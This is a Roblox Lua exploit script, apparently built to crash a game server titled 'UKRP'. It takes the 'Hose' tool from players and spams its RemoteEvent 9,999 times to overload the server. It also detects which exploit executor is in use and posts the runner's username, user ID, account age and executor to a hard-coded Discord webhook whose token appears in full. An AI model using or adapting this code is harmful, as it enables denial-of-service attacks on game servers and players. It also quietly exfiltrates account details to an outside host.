lp = game.Players.LocalPlayer
lc = lp.Character

for i,v in pairs(game.Players:GetDescendants()) do
    if v.Name == ("Hose") then
        v.Parent = lp.Backpack
    end
end

lc.Humanoid:EquipTool(lp.Backpack.Hose)
wait(0.1)

for i = 1, 9999 do
    crashargs = {
        [1] = "Fire",
        [2] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
    }
    
    lc.Hose.RemoteEvent:FireServer(unpack(crashargs))
end

lp = game.Players.LocalPlayer

local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)

local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
        (isexecutorclosure and "Script-Ware V2") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "SirHurt V4") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()['CalamariLuaEnv'] and "Calamari") or
        (unit and "Unit") or
        ("Undetectable")
    return exploit
end

local Embed = {
			["title"] = "UKRP Crash",
			["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
			["type"] = "rich",
			["color"] = tonumber(0xffff02),
	                ["thumbnail"] = {
				["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
			},
			["image"] = {
				["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
			},
			["fields"] = {
				{
					["name"] = "__Account Age:__",
					["value"] = plr.AccountAge.." days old",
					["inline"] = true
				},
				{
					["name"] = "__User ID:__",
					["value"] = plr.UserId,
					["inline"] = true
				}
			},
			["footer"] = {
			    ["text"] = "Pro machine",
			    ["icon_url"] = "file:///C:/Users/izzyi/Downloads/tumblr_922d34972584e948007f690483db2736_28095625_540.webp"
			},
			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
(syn and syn.request or http_request or http.request) {
    Url = 'https://discord.com/api/webhooks/998950859843059772/92Z9smK2nonYWIrDCJ74hND07djQJYATEAILEXIspcl9LZYqk_VoREeIug5XH_VsLOVn';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};
